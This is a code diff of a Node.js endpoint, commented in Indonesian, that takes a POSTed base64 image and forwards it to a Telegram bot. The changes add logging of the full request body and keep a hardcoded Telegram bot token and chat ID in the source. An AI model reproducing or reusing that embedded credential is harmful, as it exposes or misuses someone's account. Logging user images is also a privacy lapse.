@@ -3,11 +3,11 @@ import fetch from 'node-fetch';
 import { Buffer } from 'buffer';
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ ok: false, error: 'Method not allowed' });
-  }
+  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'Method not allowed' });
 
   try {
+    console.log('Request masuk:', req.body);
+
     const body = req.body;
     const dataUrl = body?.image;
     if (!dataUrl) return res.status(400).json({ ok: false, error: 'No image' });
@@ -22,7 +22,7 @@ export default async function handler(req, res) {
     const base64 = matches[2];
     const buffer = Buffer.from(base64, 'base64');
 
-    // <-- Langsung di hardcode (untuk testing) -->
+    // Hardcode token & chat ID
     const BOT_TOKEN = '8599132476:AAFbhY9f4Eo-VvnuhwgJD8erb89bYgMgQyU';
     const CHAT_ID   = '8599132476';
 
@@ -39,9 +39,7 @@ export default async function handler(req, res) {
 
     const tgJson = await tgRes.json();
 
-    if (!tgRes.ok) {
-      return res.status(502).json({ ok: false, error: 'Telegram error', detail: tgJson });
-    }
+    if (!tgRes.ok) return res.status(502).json({ ok: false, error: 'Telegram error', detail: tgJson });
 
     return res.status(200).json({ ok: true, telegram: tgJson });
   } catch (err) {
